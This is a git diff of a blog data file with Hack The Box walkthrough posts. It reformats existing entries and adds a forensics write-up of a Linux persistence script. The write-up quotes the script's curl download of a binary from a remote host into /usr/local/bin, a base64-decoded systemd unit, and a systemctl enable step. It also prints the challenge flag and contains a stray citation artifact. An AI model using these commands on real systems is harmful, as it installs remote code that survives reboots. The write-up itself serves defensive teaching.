@@ -172,15 +172,15 @@ Before we let you in, you’ll need to give us the password:</code></pre>
 `
   },
   //Open Secret
-{
-  slug: "htb-opensecret-walkthrough",
-  title: "HTB: OpenSecret Walkthrough",
-  date: "2026-03-03",
-  readTime: "7 min read",
-  tags: ["HTB", "Web Security", "JWT", "Pentesting"],
-  excerpt:
-    "A walkthrough of Hack The Box's OpenSecret challenge. We analyze a vulnerable helpdesk portal and exploit insecure JWT handling to retrieve the flag.",
-  content: `
+  {
+    slug: "htb-opensecret-walkthrough",
+    title: "HTB: OpenSecret Walkthrough",
+    date: "2026-03-03",
+    readTime: "7 min read",
+    tags: ["HTB", "Web Security", "JWT", "Pentesting"],
+    excerpt:
+      "A walkthrough of Hack The Box's OpenSecret challenge. We analyze a vulnerable helpdesk portal and exploit insecure JWT handling to retrieve the flag.",
+    content: `
     <h1>HTB: OpenSecret Walkthrough</h1>
 
     <p>
@@ -354,17 +354,17 @@ Before we let you in, you’ll need to give us the password:</code></pre>
       OpenSecret is a great intro to JWT testing and authentication pitfalls. More HTB walkthroughs coming soon.
     </p>
   `
-},
-//Oddly Even
-{
-  slug: "htb-oddly-even-walkthrough",
-  title: "HTB: Oddly Even Walkthrough",
-  date: "2026-03-05",
-  readTime: "5 min read",
-  tags: ["HTB", "Coding", "Python", "Beginner"],
-  excerpt:
-    "A simple Hack The Box coding challenge focused on basic conditional logic. Take a number as input and print whether it is odd or even.",
-  content: `
+  },
+  //Oddly Even
+  {
+    slug: "htb-oddly-even-walkthrough",
+    title: "HTB: Oddly Even Walkthrough",
+    date: "2026-03-05",
+    readTime: "5 min read",
+    tags: ["HTB", "Coding", "Python", "Beginner"],
+    excerpt:
+      "A simple Hack The Box coding challenge focused on basic conditional logic. Take a number as input and print whether it is odd or even.",
+    content: `
     <h1>HTB: Oddly Even Walkthrough</h1>
 
     <p>
@@ -518,17 +518,17 @@ else:
       More HTB walkthroughs coming soon.
     </p>
   `
-},
-//Flag Command
-{
-  slug: "htb-flag-command-walkthrough",
-  title: "HTB: Flag Command Walkthrough",
-  date: "2026-03-05",
-  readTime: "6 min read",
-  tags: ["HTB", "Web Security", "CTF", "Beginner"],
-  excerpt:
-    "A walkthrough of Hack The Box's Flag Command challenge, a very easy web challenge built around a terminal-style interface and careful input handling.",
-  content: `
+  },
+  //Flag Command
+  {
+    slug: "htb-flag-command-walkthrough",
+    title: "HTB: Flag Command Walkthrough",
+    date: "2026-03-05",
+    readTime: "6 min read",
+    tags: ["HTB", "Web Security", "CTF", "Beginner"],
+    excerpt:
+      "A walkthrough of Hack The Box's Flag Command challenge, a very easy web challenge built around a terminal-style interface and careful input handling.",
+    content: `
     <h1>HTB: Flag Command Walkthrough</h1>
 
     <p>
@@ -716,6 +716,193 @@ else:
 
     <p>
       More HTB walkthroughs coming soon.
+    </p>
+  `
+  },
+{
+  slug: "htb-extraterrestrial-persistence-walkthrough",
+  title: "HTB: Extraterrestrial Persistence Walkthrough",
+  date: "2026-03-06",
+  readTime: "6 min read",
+  tags: ["HTB", "Forensics", "Linux", "Persistence"],
+  excerpt:
+    "A walkthrough of Hack The Box's Extraterrestrial Persistence challenge. We analyze a suspicious bash script and uncover a hidden systemd persistence mechanism containing the flag.",
+  content: `
+    <h1>HTB: Extraterrestrial Persistence Walkthrough</h1>
+
+    <p>
+      Extraterrestrial Persistence is a <strong>Hack The Box forensics challenge</strong> that focuses on analyzing a suspicious
+      Linux persistence mechanism. Instead of exploiting a system, the task is to inspect a provided script and determine
+      how the attacker installs persistence on the machine.
+    </p>
+
+    <p>
+      The challenge revolves around a bash script called <code>persistence.sh</code> that appears to install a malicious
+      service on a compromised Linux system.
+    </p>
+
+    <hr />
+
+    <h2>Video Walkthrough</h2>
+
+    <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; border-radius: 16px;">
+      <iframe
+        src="https://www.youtube.com/embed/amJjOuxU7sA"
+        title="HTB Extraterrestrial Persistence Walkthrough"
+        frameborder="0"
+        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
+        allowfullscreen
+        style="position: absolute; top: 0; left: 0; width: 100%; height: 100%;"
+      ></iframe>
+    </div>
+
+    <hr />
+
+    <h2>Challenge Overview</h2>
+
+    <p>
+      The challenge provides a bash script named <code>persistence.sh</code>. At first glance, the script looks like a
+      persistence mechanism that installs a system service and downloads a payload from a remote location.
+    </p>
+
+    <p>
+      Our goal is to analyze the script and determine how the persistence works and where the flag is hidden.
+    </p>
+
+    <hr />
+
+    <h2>Step 1: Inspect the Script</h2>
+
+    <p>
+      Opening the script reveals several key behaviors:
+    </p>
+
+    <ul>
+      <li>It checks the current user with <code>whoami</code></li>
+      <li>It checks the hostname of the system</li>
+      <li>It downloads a file using <code>curl</code></li>
+      <li>It creates a new systemd service</li>
+    </ul>
+
+    <p>
+      These checks ensure the persistence mechanism only installs on the intended target machine.
+    </p>
+
+    <pre><code class="language-bash">n=\`whoami\`
+h=\`hostname\`
+
+if [[ "$n" != "pandora" && "$h" != "linux_HQ" ]]; then
+  exit
+fi</code></pre>
+
+    <p>
+      If the environment does not match the expected user and hostname, the script exits immediately.
+    </p>
+
+    <hr />
+
+    <h2>Step 2: Download the Payload</h2>
+
+    <p>
+      The script then downloads a binary payload and installs it in the system:
+    </p>
+
+    <pre><code class="language-bash">curl https://files.pypi-install.com/packeges/service -o /usr/local/bin/service
+chmod +x /usr/local/bin/service</code></pre>
+
+    <p>
+      This binary becomes the executable that will run through the persistence mechanism.
+    </p>
+
+    <hr />
+
+    <h2>Step 3: Decode the Hidden Payload</h2>
+
+    <p>
+      The most interesting part of the script is a large <strong>Base64 encoded string</strong>.
+      The script decodes this string and writes it into a systemd service file. :contentReference[oaicite:1]{index=1}
+    </p>
+
+    <pre><code class="language-bash">echo "BASE64_DATA" | base64 --decode > /usr/lib/systemd/system/service.service</code></pre>
+
+    <p>
+      When decoded, the Base64 block reveals the contents of the systemd service configuration.
+    </p>
+
+    <p>
+      Inside the service file, the flag is embedded within the description field.
+    </p>
+
+    <pre><code>[Unit]
+Description=HTB{th3s3_4l13nS_4r3_s00000_b4s1c}</code></pre>
+
+    <hr />
+
+    <h2>Step 4: Enable Persistence</h2>
+
+    <p>
+      Finally, the script enables the service using systemd:
+    </p>
+
+    <pre><code class="language-bash">systemctl enable service.service</code></pre>
+
+    <p>
+      This ensures the malicious service will execute every time the system boots.
+    </p>
+
+    <p>
+      Attackers often use systemd services for persistence because they blend in with legitimate
+      system processes.
+    </p>
+
+    <hr />
+
+    <h2>Why This Technique Works</h2>
+
+    <p>
+      The persistence mechanism works by abusing legitimate Linux features:
+    </p>
+
+    <ul>
+      <li>Downloading a payload to a trusted system path</li>
+      <li>Creating a custom systemd service</li>
+      <li>Automatically launching the service at boot</li>
+    </ul>
+
+    <p>
+      Because systemd services are a normal part of Linux operation, malicious entries can be easy
+      to overlook during incident response if defenders are not carefully auditing service files.
+    </p>
+
+    <hr />
+
+    <h2>Tools Used</h2>
+
+    <ul>
+      <li>Basic text inspection</li>
+      <li>Bash script analysis</li>
+      <li>Base64 decoding</li>
+      <li>Understanding Linux systemd services</li>
+    </ul>
+
+    <hr />
+
+    <h2>Takeaways</h2>
+
+    <ol>
+      <li>Persistence mechanisms often hide in plain sight.</li>
+      <li>Base64 encoding is commonly used to conceal payloads.</li>
+      <li>Systemd services are a common Linux persistence technique.</li>
+      <li>Careful script analysis can reveal hidden attacker behavior.</li>
+    </ol>
+
+    <p>
+      Extraterrestrial Persistence is a great beginner forensics challenge because it shows how attackers
+      can abuse normal system functionality to maintain access to compromised machines.
+    </p>
+
+    <p>
+      More Hack The Box walkthroughs coming soon.
     </p>
   `
 }
